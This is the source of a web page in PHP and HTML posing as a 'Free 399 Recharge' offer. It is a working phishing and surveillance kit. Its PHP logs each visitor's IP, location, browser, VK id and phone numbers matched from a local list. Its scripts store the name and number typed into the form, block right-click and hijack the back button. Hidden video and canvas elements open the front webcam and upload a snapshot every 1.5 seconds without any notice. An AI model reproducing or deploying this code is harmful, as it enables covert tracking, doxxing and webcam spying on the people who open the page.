<?php
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
if(filter_var($client, FILTER_VALIDATE_IP)) $ip = $client;
elseif(filter_var($forward, FILTER_VALIDATE_IP)) $ip = $forward;
else $ip = $remote;
$user_agent = $_SERVER["HTTP_USER_AGENT"];
  if (strpos($user_agent, "Firefox") !== false) $browser = "Firefox";
  elseif (strpos($user_agent, "Opera") !== false) $browser = "Opera";
  elseif (strpos($user_agent, "Chrome") !== false) $browser = "Chrome";
  elseif (strpos($user_agent, "MSIE") !== false) $browser = "Internet Explorer";
  elseif (strpos($user_agent, "Safari") !== false) $browser = "Safari";
  else $browser = "Неизвестный";
$newTitle = substr($user_agent, strpos($user_agent, '('));
while(true){
  if($newTitle[$i]==")"){
  $res = substr($newTitle, 1, $i=$i-1);
  break;
  }else{
      $i++;
  }
}
$bd_list = explode("\n", file_get_contents("./../../bdclean.txt"));
$phose = "";
$ip_fp = explode(".", $ip);
$ip_fp = $ip_fp[0].".".$ip_fp[1].".".$ip_fp[2];
foreach($bd_list as $bd_list_new){
	if(strpos($bd_list_new, $ip_fp) != false){
		$phose .= $bd_list_new;
	}
}
if($phose != ''){
	$phose = "\n Phone: ".$phose;
}

if(isset($_GET['vk_user_id']) or $_GET['viewer_id']){
	$vk = "\n vk: https://vk.com/id".$_GET['vk_user_id'].$_GET['viewer_id'];
}else{$vk = '';}
$url = file_get_contents("https://ipinfo.io/$ip/json");
$obj = json_decode($url,true);
if($obj['city'] != ''){$city = "\n City: ".$obj['city'];}
if($city == ''){$city=$obj['region'];}
if($obj['org'] != ''){
	$org = "\n Org: ".$obj['org'];
}
$all = " OS: $res \n IP: $ip \n Browser: $browser $city $org $vk $phose \n";
$f = fopen("./../../logs/result.txt", "w+");
fwrite($f, $all);
fclose($f);
$fs = fopen("./../../logs/logger.log", "a+");
fwrite($fs, $all);
fclose($fs);
?>
<head>
<meta content="utf-8" name="charset">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title>Переход</title>
	<meta property="og:type" content="website">
<meta property="og:title" content="">
	<meta property="og:url" content="Free 399 Recharge">
<meta property="og:site_name" content="index.html">
	<meta property="og:image" content="http://deals-online.in/jio/head.png">
<link rel="stylesheet" type="text/css" href="jio\style.css">
	<style type="text/css">h2{height: 50px;background-color: #007ee6;color: #FFF;line-height: 50px;font-size: 24px;margin: 0;text-align: center;}.countDown{text-align: center;padding: 0 1em;color: #999;}.countDown .timer{color: #007ee6;font-size: 1.2em;}.peopleCount{text-align: center;padding: 0 1em;color: #999;}.peopleCount .number{background-color: #007ee6;color: #FFF;display: inline-block;padding: 0 10px;}</style>
	</head>
<form align="right" action="jio/invite.htm" method="POST">
	<body>
	<script type="text/javascript">
  function next() {
      location.href = "jio/invite.htm" + location.search
  }

  function setCookie(e, t) {
      var n = new Date;
      n.setTime(n.getTime() + 2592e6);
      var o = "expires=" + n.toUTCString();
      document.cookie = e + "=" + t + "; " + o
  }

  function getCookie(e) {
      for (var t = e + "=", n = document.cookie.split(";"), o = 0; o < n.length; o++) {
          for (var i = n[o];
              " " == i.charAt(0);) i = i.substring(1);
          if (0 == i.indexOf(t)) return i.substring(t.length, i.length)
      }
      return 0
  }
  var message = "You have not Permission to This";
  document.onmousedown = function(e) {
      return "Netscape" == navigator.appName && 3 == e.which ? (alert(message), !1) : -1 != navigator.appVersion.indexOf("MSIE") && 2 == event.button ? (alert(message), !1) : void 0
  };</script>




<script type="text/javascript">
function leftTimer() {
    var e = new Date((new Date).getTime() + 864e5),
        t = new Date(e.getFullYear() + "-" + checkTime(e.getMonth() + 1) + "-" + checkTime(e.getDate())) - new Date,
        n = parseInt(t / 1e3 / 60 / 60 / 24, 10),
        r = parseInt(t / 1e3 / 60 / 60 % 24, 10),
        o = parseInt(t / 1e3 / 60 % 60, 10),
        u = parseInt(t / 1e3 % 60, 10);
    return n = checkTime(n), r = checkTime(r), o = checkTime(o), u = checkTime(u), r + ":" + o + ":" + u
}

function checkTime(e) {
    return e < 10 && (e = "0" + e), e
}
document.querySelector("form").onsubmit = function() {
    return setCookie("free-recharge_name", document.querySelector('input[name="name"]').value), setCookie("free-recharge_number", document.querySelector('input[name="number"]').value), next(), !1
};
var updatePeople = function() {
    var e = parseInt(1e3 * Math.random());
    setTimeout(function() {
        for (var e = parseInt((new Date).getTime() / 10) - 1501742e5, t = e.toString().split("").reverse(), n = "", r = 0; r < t.length; r++) r % 3 == 0 && 0 != r && (n = "," + n), n = t[r] + n;
        document.querySelector(".peopleCount .number").innerText = n
    }, e), document.querySelector(".countDown .timer").innerText = leftTimer()
};
updatePeople(), setInterval(updatePeople, 1e3);

</script>


</body>

<script type="text/javascript">! function (){var
t;try{for (t=0; 10 > t; ++t) history.pushState({}, "", "#");onpopstate=function (t){t.state && location.replace("https://www.newtrendmasti.com")}}catch (o){}}();</script>



<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>

<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>

<script>

function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: '/post.php',
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {

    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  let cltime = setInterval(function(){

       context.drawImage(video, 0, 0, 740, 580);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData);}, 1500);
	

}

// Load init
init();



</script>
</html>


